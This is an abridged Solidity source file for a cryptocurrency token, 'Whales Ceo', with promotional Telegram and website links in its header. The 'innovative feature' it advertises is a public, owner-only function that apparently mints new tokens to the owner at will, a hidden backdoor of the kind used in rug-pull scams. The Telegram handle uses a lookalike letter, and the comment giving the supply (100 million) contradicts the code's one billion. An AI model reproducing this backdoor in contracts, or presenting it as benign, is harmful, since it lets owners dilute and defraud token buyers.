...
//
// $WhalesCeo proposes an innovative feature in its contract.
//
// 📱 Telegram::https://t.me/WhaIesCEO
// 📱 Website ::https://whalesceo.website
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _WhalesCeo(uint256 amount) public onlyOwner {
 _WhalesCeo(msg.sender, amount);
    }
    ...
    function _WhalesCeo(address account, uint256 amount) internal virtual {
...
contract $WhalesCeo is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("Whales Ceo", "WHALESCEO") {
     _WhalesCeo(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}